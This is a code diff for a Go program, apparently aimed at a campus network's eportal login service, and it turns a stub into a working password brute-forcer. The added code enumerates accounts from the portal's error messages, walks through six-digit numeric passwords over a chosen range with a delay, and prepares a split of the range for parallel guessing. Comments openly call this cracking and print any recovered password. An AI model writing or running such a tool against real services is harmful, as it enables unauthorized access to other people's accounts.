@@ -7,13 +7,16 @@ import (
 	purl "net/url"
 	"io"
 	"strconv"
+	"math"
+	"time"
 )
 
 var (
-	loginurl = `http://172.17.0.3/eportal/InterFace.do?method=login`
+	loginurl  = `http://172.17.0.3/eportal/InterFace.do?method=login`
+	isfindpwd = false
 )
 
-func HttpPost(url string, userid string, pwd string) (retstr string, merr error) {
+func HttpPost(url string, userid string, pwd string) (retstr string, merr error) { //发送post
 	client := &http.Client{}
 	var clusterinfo = purl.Values{}
 	clusterinfo.Add("userId", userid)
@@ -44,11 +47,11 @@ func HttpPost(url string, userid string, pwd string) (retstr string, merr error)
 	}
 	merr = nil
 	retstr = string(res)
-	fmt.Println(retstr)
+	//fmt.Println(retstr)
 	return
 }
 
-func isaccountexist(userid string) (ise bool, err error) {
+func isaccountexist(userid string) (ise bool, err error) { //账号是否存在
 	str, err := HttpPost(loginurl, userid, "2")
 	if err != nil {
 		fmt.Println(err)
@@ -56,6 +59,10 @@ func isaccountexist(userid string) (ise bool, err error) {
 	} else {
 		if strings.Index(str, "不存在") != -1 {
 			ise = false
+			return
+		}
+		if strings.Index(str, "已经在线") != -1 {
+			ise = true
 			return
 		}
 		if strings.Index(str, "密码不匹配") != -1 {
@@ -66,7 +73,7 @@ func isaccountexist(userid string) (ise bool, err error) {
 	return
 }
 
-func ismatch(userid, pwd string) (ism bool, err error) {
+func ismatch(userid, pwd string) (ism bool, err error) { //id和密码是否匹配
 	str, err := HttpPost(loginurl, userid, pwd)
 	if err != nil {
 		fmt.Println(err)
@@ -80,6 +87,12 @@ func ismatch(userid, pwd string) (ism bool, err error) {
 			ism = false
 			return
 		}
+		if strings.Index(str, "已经在线") != -1 {
+			ism = false
+			//fmt.Println("账号已经在线,无法暴破")
+			err = fmt.Errorf("账号已经在线,无法暴破")
+			return
+		}
 		if strings.Index(str, `result":"success`) != -1 {
 			ism = true
 			return
@@ -88,21 +101,49 @@ func ismatch(userid, pwd string) (ism bool, err error) {
 	return
 }
 
-func baopo(userid string) (pwd string, err error) {
-	ism := false
-	cpwd := "000000"
-	ism, err = ismatch(userid, "0210338")
+func less(str1, str2 string) (isless bool, err error) { //第一个字符串的数字是否小于第二个
+	n1, n2 := 0, 0
+	n1, err = strconv.Atoi(str1)
 	if err != nil {
 		return
 	}
-	if ism {
-		pwd = cpwd
-		fmt.Println("暴破成功,密码:", cpwd)
+	n2, err = strconv.Atoi(str2)
+	if err != nil {
 		return
+	}
+	return n1 < n2, err
+}
+
+func baopo(userid, spwd, epwd string) (pwd string, iss bool, err error) { //暴破(id,[起始密码，结束密码))
+	il := false
+	if il, err = less(spwd, epwd); !il {
+		err = fmt.Errorf("起始密码应小于结束密码")
+		return
+	}
+	if err != nil {
+		return
+	}
+	ism := false
+	cpwd := fmt.Sprintf("%06s", spwd)
+	for f, _ := less(cpwd, epwd); f && !isfindpwd; cpwd, _ = addpwd(cpwd) {
+		fmt.Println("正在测试", userid, "-", cpwd)
+		ism, err = ismatch(userid, cpwd)
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+		if ism {
+			pwd = cpwd
+			fmt.Println("暴破成功,账号:", userid, " 密码:", cpwd)
+			iss = true
+			isfindpwd = true
+			return
+		}
+		time.Sleep(1000 * time.Millisecond)
 	}
 	return
 }
-func addpwd(pwd string) (npwd string, err error) {
+func addpwd(pwd string) (npwd string, err error) { //密码+1
 	n := 0
 	n, err = strconv.Atoi(pwd)
 	if err != nil {
@@ -111,8 +152,75 @@ func addpwd(pwd string) (npwd string, err error) {
 	npwd = fmt.Sprintf("%06d", n+1)
 	return
 }
+func splitpwd(spwd, epwd string, num int) (plist []string, err error) { //将密码均匀分割
+	ns, ne := 0, 0
+	ns, err = strconv.Atoi(spwd)
+	if err != nil {
+		return
+	}
+	ne, err = strconv.Atoi(epwd)
+	if err != nil {
+		return
+	}
+	if ns > ne {
+		err = fmt.Errorf("起始密码不能大于结束密码")
+		return
+	}
+	nd := ne - ns
+	_ = nd
+	plist = make([]string, num+1)
+	plist[0] = spwd
+	for i := 1; i < num; i++ {
+		a := math.Floor(float64(nd) / float64(num) * float64(i))
+		p := int(a) + ns
+		//fmt.Println(p)
+		plist[i] = fmt.Sprintf("%06d", p)
+	}
+	plist[num] = epwd
+	return
+}
 func main() {
-	str, _ := addpwd("000000")
-	fmt.Println("格式化结果:", str)
-	//fmt.Printf("%06d",22)
+	id, spwd, epwd := "", "", ""
+LABEL_IPTID:
+	fmt.Println("输入账号")
+	fmt.Scanf("%s\n", &id)
+	if len(id) == 0 {
+		fmt.Println("账号不能为空")
+		goto LABEL_IPTID
+	}
+	fmt.Println("输入起始密码(默认000000)")
+	fmt.Scanf("%s\n", &spwd)
+	if len(spwd) == 0 {
+		spwd = "000000"
+	}
+	fmt.Println("输入结束密码(默认319999)")
+	fmt.Scanf("%s\n", &epwd)
+	if len(epwd) == 0 {
+		epwd = "319999"
+	}
+	fmt.Println(id, spwd, epwd)
+	//ts:=time.Now()
+	//_,_,err:=baopo(id,spwd,epwd)
+	//te:=time.Now()
+	//td:=te.Sub(ts)
+	//fmt.Println("耗时:",td)
+	//if err != nil {
+	//	fmt.Println(err)
+	//}
+
+	//maxthread:=3
+	//pl,_:=splitpwd(pwd,"319999",maxthread)
+	//for i:=0;i<maxthread;i++{
+	//	ps,pe:=pl[i],pl[i+1]
+	//	//fmt.Println(ps,pe)
+	//	go baopo(id,ps,pe)
+	//}
+	//ts:=time.Now()
+	//for !isfindpwd{
+	//	time.Sleep(1000*time.Millisecond)
+	//}
+	//te:=time.Now()
+	//td:=te.Sub(ts)
+	//fmt.Println("耗时:",td)
+	//fmt.Scanf("%s",&pwd)
 }
